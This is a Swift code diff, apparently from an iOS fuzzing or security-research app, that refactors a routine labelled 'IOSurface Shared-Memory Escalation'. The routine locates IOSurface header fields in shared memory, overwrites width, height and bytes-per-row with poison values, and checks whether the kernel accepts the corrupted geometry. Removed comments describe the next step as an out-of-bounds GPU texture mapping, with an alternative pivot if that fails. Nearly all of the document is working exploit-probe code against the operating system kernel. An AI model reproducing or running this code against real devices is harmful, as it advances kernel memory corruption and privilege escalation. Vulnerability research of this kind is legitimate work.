@@ -2440,16 +2440,33 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── IOSurface Shared-Memory Escalation helpers ───────────────────────────────
+private func iosFindU32LE(_ v: UInt32, _ buf: UnsafePointer<UInt8>, _ len: Int) -> Int? {
+    guard len >= 4 else { return nil }
+    let b0 = UInt8(v & 0xFF)
+    let b1 = UInt8((v >> 8) & 0xFF)
+    let b2 = UInt8((v >> 16) & 0xFF)
+    let b3 = UInt8((v >> 24) & 0xFF)
+    for i in 0 ... (len - 4) {
+        if buf[i] == b0 && buf[i+1] == b1 && buf[i+2] == b2 && buf[i+3] == b3 { return i }
+    }
+    return nil
+}
+
+private func iosDumpHex(_ buf: UnsafePointer<UInt8>, _ len: Int,
+                         step: (String) -> Void) {
+    var line = ""
+    for i in 0 ..< len {
+        if i % 16 == 0 {
+            if !line.isEmpty { step("  \(line)") }
+            line = String(format: "+0x%04x: ", i)
+        }
+        line += String(format: "%02x ", buf[i])
+    }
+    if !line.isEmpty { step("  \(line)") }
+}
+
 // ── IOSurface Shared-Memory Escalation ───────────────────────────────────────
-// IOSurfaceGetBaseAddress() returns the PIXEL BUFFER start. The IOSurface shared
-// memory region also contains a header (with geometry fields) at NEGATIVE offsets
-// from that pointer — same mapping, no mmap needed.
-// Strategy:
-//   1. Create IOSurface with magic geometry to make fields searchable.
-//   2. Lock → get pixel-buf VA → find true mapping start via msync boundary scan.
-//   3. Scan the entire shared region (header + pixel buf) for magic values.
-//   4. Write poison values directly via the userspace pointer.
-//   5. IOSurfaceLock → check if kernel picked up corrupted values.
 func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         let sl = SyncLog()
@@ -2460,7 +2477,7 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
         let SURF_W:   Int    = 0x1337
         let SURF_H:   Int    = 0x0042
         let SURF_BPR: Int    = SURF_W * 4
-        let SURF_FMT: UInt32 = 0x42475241   // 'BGRA' LE
+        let SURF_FMT: UInt32 = 0x42475241
 
         let props: [IOSurfacePropertyKey: Any] = [
             .width:           SURF_W,
@@ -2482,121 +2499,91 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
             step("✗ IOSurfaceGetBaseAddress returned NULL"); completion(); return
         }
 
-        let surfVA  = UInt(bitPattern: surfBaseRaw)
-        let PAGE_SZ = 4096
-        step("pixelBuf VA=0x\(String(surfVA,radix:16)) allocSz=\(allocSz)")
+        let surfVA = UInt(bitPattern: surfBaseRaw)
+        step("pixelBuf VA=0x\(String(surfVA, radix: 16)) allocSz=\(allocSz)")
 
-        // ── Find true mapping start via msync boundary scan ──────────────────────
-        // msync() returns -1/ENOMEM for unmapped pages — use it to probe backwards.
         var headerStart = surfVA
-        let MAX_SCAN_BACK = 256 * 1024
-        for back in stride(from: PAGE_SZ, through: MAX_SCAN_BACK, by: PAGE_SZ) {
+        let PAGE_SZ     = 4096
+        let MAX_SCAN    = 256 * 1024
+        for back in stride(from: PAGE_SZ, through: MAX_SCAN, by: PAGE_SZ) {
             let testVA = surfVA &- UInt(back)
-            let r = msync(UnsafeMutableRawPointer(bitPattern: testVA), PAGE_SZ, MS_ASYNC)
+            let r = msync(UnsafeMutableRawPointer(bitPattern: testVA), PAGE_SZ, Int32(1))
             if r == -1 { break }
             headerStart = testVA
         }
-        let headerOff  = Int(surfVA - headerStart)
-        let totalLen   = headerOff + allocSz
-        step("shared mapping: 0x\(String(headerStart,radix:16))..+0x\(String(totalLen,radix:16))")
-        step("  header before pixel buf: \(headerOff) bytes")
+        let headerOff = Int(surfVA - headerStart)
+        let totalLen  = headerOff + allocSz
+        step("mapping: 0x\(String(headerStart, radix: 16))  hdrOff=\(headerOff)  total=\(totalLen)")
 
         let basePtr = UnsafeMutableRawPointer(bitPattern: headerStart)!
-                          .assumingMemoryBound(to: UInt8.self)
+                         .assumingMemoryBound(to: UInt8.self)
 
-        // ── Search entire shared region for magic geometry values ────────────────
-        func findU32LE(_ v: UInt32, _ buf: UnsafePointer<UInt8>, _ len: Int) -> Int? {
-            guard len >= 4 else { return nil }
-            let b0 = UInt8(v&0xFF), b1 = UInt8((v>>8)&0xFF), b2 = UInt8((v>>16)&0xFF), b3 = UInt8((v>>24)&0xFF)
-            for i in 0...(len-4) {
-                if buf[i]==b0 && buf[i+1]==b1 && buf[i+2]==b2 && buf[i+3]==b3 { return i }
-            }
-            return nil
-        }
+        let widthOff  = iosFindU32LE(UInt32(SURF_W),   basePtr, totalLen)
+        let heightOff = iosFindU32LE(UInt32(SURF_H),   basePtr, totalLen)
+        let bprOff    = iosFindU32LE(UInt32(SURF_BPR), basePtr, totalLen)
+        let fmtOff    = iosFindU32LE(SURF_FMT,          basePtr, totalLen)
 
-        let widthOff  = findU32LE(UInt32(SURF_W),   basePtr, totalLen)
-        let heightOff = findU32LE(UInt32(SURF_H),   basePtr, totalLen)
-        let bprOff    = findU32LE(UInt32(SURF_BPR), basePtr, totalLen)
-        let fmtOff    = findU32LE(SURF_FMT,          basePtr, totalLen)
+        let wStr   = widthOff  == nil ? "NOT FOUND" : "@ hdr+0x\(String(widthOff!,  radix: 16))"
+        let hStr   = heightOff == nil ? "NOT FOUND" : "@ hdr+0x\(String(heightOff!, radix: 16))"
+        let bprStr = bprOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(bprOff!,   radix: 16))"
+        let fmtStr = fmtOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(fmtOff!,   radix: 16))"
+        step("  width  : \(wStr)")
+        step("  height : \(hStr)")
+        step("  BPR    : \(bprStr)")
+        step("  fmt    : \(fmtStr)")
 
-        step("── Geometry scan ──")
-        let wStr   = widthOff  == nil ? "NOT FOUND" : "@ hdr+0x\(String(widthOff!,  radix:16))"
-        let hStr   = heightOff == nil ? "NOT FOUND" : "@ hdr+0x\(String(heightOff!, radix:16))"
-        let bprStr = bprOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(bprOff!,   radix:16))"
-        let fmtStr = fmtOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(fmtOff!,   radix:16))"
-        step("  width  (0x\(String(SURF_W,  radix:16))): \(wStr)")
-        step("  height (0x\(String(SURF_H,  radix:16))): \(hStr)")
-        step("  BPR    (0x\(String(SURF_BPR,radix:16))): \(bprStr)")
-        step("  fmt    (0x\(String(SURF_FMT,radix:16))): \(fmtStr)")
-
-        // Dump first 256B of header (pre-pixel region)
         if headerOff > 0 {
-            step("── shared header dump (pre-pixelbuf, up to 256B) ──")
-            let dumpLen = min(headerOff, 256)
-            var hexLine = ""
-            for i in 0..<dumpLen {
-                if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
-                hexLine += String(format: "%02x ", basePtr[i])
-            }
-            if !hexLine.isEmpty { step("  \(hexLine)") }
+            step("── header dump ──")
+            iosDumpHex(basePtr, min(headerOff, 256), step: step)
         } else {
-            step("  header region = 0 bytes — geometry likely lives in pixel buffer")
-            step("── pixel buf dump (first 256B) ──")
-            let dumpLen = min(256, allocSz)
-            var hexLine = ""
-            let surfPtr = UnsafeMutableRawPointer(bitPattern: surfVA)!.assumingMemoryBound(to: UInt8.self)
-            for i in 0..<dumpLen {
-                if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
-                hexLine += String(format: "%02x ", surfPtr[i])
-            }
-            if !hexLine.isEmpty { step("  \(hexLine)") }
+            step("── pixelbuf dump (hdrOff=0) ──")
+            let surfPtr = UnsafeMutableRawPointer(bitPattern: surfVA)!
+                             .assumingMemoryBound(to: UInt8.self)
+            iosDumpHex(surfPtr, min(256, allocSz), step: step)
         }
 
-        // ── Poison write directly into shared memory ─────────────────────────────
         let POISON_BPR: UInt32 = 0x7FFFFFFF
         let POISON_DIM: UInt32 = 0x00007FFF
         var corrupted = false
 
         if let off = bprOff {
-            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_BPR, as: UInt32.self)
-            step("  poison BPR=0x\(String(POISON_BPR,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_BPR, as: UInt32.self)
+            step("  poisoned BPR @ hdr+0x\(String(off, radix: 16))")
             corrupted = true
         }
         if let off = widthOff {
-            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_DIM, as: UInt32.self)
-            step("  poison W=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_DIM, as: UInt32.self)
+            step("  poisoned W @ hdr+0x\(String(off, radix: 16))")
             corrupted = true
         }
         if let off = heightOff {
-            UnsafeMutableRawPointer(basePtr.advanced(by: off)).storeBytes(of: POISON_DIM, as: UInt32.self)
-            step("  poison H=0x\(String(POISON_DIM,radix:16)) @ hdr+0x\(String(off,radix:16))")
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_DIM, as: UInt32.self)
+            step("  poisoned H @ hdr+0x\(String(off, radix: 16))")
             corrupted = true
         }
         if !corrupted {
-            step("  no fields found — blind poison at hdr+0x0..+0xb")
-            let rawBase = UnsafeMutableRawPointer(basePtr)
-            rawBase.storeBytes(of: POISON_BPR, as: UInt32.self)
-            rawBase.advanced(by: 4).storeBytes(of: POISON_DIM, as: UInt32.self)
-            rawBase.advanced(by: 8).storeBytes(of: POISON_DIM, as: UInt32.self)
+            step("  no fields found — blind poison @0..11")
+            let raw = UnsafeMutableRawPointer(basePtr)
+            raw.storeBytes(of: POISON_BPR, as: UInt32.self)
+            raw.advanced(by: 4).storeBytes(of: POISON_DIM, as: UInt32.self)
+            raw.advanced(by: 8).storeBytes(of: POISON_DIM, as: UInt32.self)
         }
 
-        // ── IOSurfaceLock — triggers kernel geometry re-read ─────────────────────
-        step("── IOSurfaceLock post-corruption ──")
         var seed2: UInt32 = 0
         let lockKR = IOSurfaceLock(surf, [], &seed2)
-        step("  lock kr=\(lockKR) seed=\(seed2)")
+        step("  lock kr=\(lockKR)")
         if lockKR == 0 {
             let w2   = IOSurfaceGetWidth(surf)
             let h2   = IOSurfaceGetHeight(surf)
             let bpr2 = IOSurfaceGetBytesPerRow(surf)
-            step("  post-lock: width=\(w2) height=\(h2) BPR=\(bpr2)")
+            step("  post-lock: w=\(w2) h=\(h2) bpr=\(bpr2)")
             if w2 != SURF_W || h2 != SURF_H || bpr2 != SURF_BPR {
-                step("  *** GEOMETRY CHANGED — kernel trusts attacker-controlled shared memory ***")
-                step("  *** width \(SURF_W)→\(w2)  height \(SURF_H)→\(h2)  BPR \(SURF_BPR)→\(bpr2) ***")
-                step("  *** NEXT STEP: make texture from surface → OOB GPU texture map ***")
+                step("  *** GEOMETRY CHANGED — kernel trusts shared mem ***")
             } else {
-                step("  geometry stable — kernel has its own hardened copy (shared mem ignored)")
-                step("  → PIVOT: ICB/indirect-dispatch corruption path")
+                step("  geometry stable — kernel ignores shared mem")
             }
             IOSurfaceUnlock(surf, [], &seed2)
         } else {
